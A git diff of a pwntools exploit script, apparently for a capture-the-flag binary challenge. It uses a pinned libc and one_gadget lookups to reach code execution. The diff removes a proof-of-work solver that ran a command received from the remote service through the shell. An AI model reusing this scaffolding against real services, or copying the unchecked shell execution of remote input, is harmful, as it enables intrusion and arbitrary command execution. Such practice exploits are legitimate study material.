@@ -8,14 +8,6 @@ libc = ELF("./libc6_2.35-0ubuntu3.1_amd64.so")
 context.binary = elf
 NULL = 0x0
 
-
-'''
-    #######################################
-    #  REST AT THE END NOT IN THE MIDDLE  #
-    #######################################
-'''
-
-
 def conn():
     global p, ssh_con
     ssh_conn = ('HOST', 22, 'USER', 'PASS', 'BIN_NAME')
@@ -44,21 +36,6 @@ def conn():
 
 def get_one_gadget(filename: str, base_address=NULL) -> int:
     return [i + base_address for i in [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]]
-
-def solve_poc(p):
-    p.recvuntil(b"work: ")
-    cmd = p.recvline()
-    proc = log.progress(f"solving POC")
-    
-    try:
-        solve = subprocess.check_output(cmd, shell=True, text=True).strip()
-        proc.success("Done")
-    except:
-        proc.failure("Error")
-        exit(-1)
-
-    log.info(f"solve @ {solve}")
-    p.sendline(solve.encode('utf-8'))
 
 def roomOfLoom(content):
     p.sendlineafter(b"> ", b"1", timeout=0.1)
